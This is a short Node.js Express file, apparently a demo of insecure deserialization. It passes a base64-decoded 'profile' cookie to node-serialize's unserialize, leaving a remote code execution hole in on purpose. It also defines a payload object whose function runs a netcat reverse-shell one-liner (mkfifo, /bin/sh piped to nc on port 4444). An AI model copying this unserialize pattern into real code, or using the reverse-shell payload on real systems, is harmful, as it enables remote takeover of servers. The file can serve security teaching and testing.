// Insecure Deserialization Threat

var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())

x = {
    test : function(){
      require('child_process').execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f", function puts(error, stdout, stderr) {});
    }
    };

    // console.log("Serialized: \n" + serialize.serialize(x));

app.get('/', function(req, res) {
 if (req.cookies.profile) {
   var str = new Buffer(req.cookies.profile, 'base64').toString();
   console.log(str)
    var obj = serialize.unserialize(str);
    console.log(obj)
    //console.log(obj.username)
    if (obj.username) {
      res.send("Hello " + escape(obj.username) + "<br>" + "Your City is "+escape(obj.city) + "<br>" + "Your country is " + escape(obj.country));
    }
 } else {
     res.cookie('profile', "eyJ1c2VybmFtZSI6IkFkaXR5YSIsImNvdW50cnkiOiJpbmRpYSIsImNpdHkiOiJEZWxoaSJ9", {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("Hello World");
});
app.listen(3000);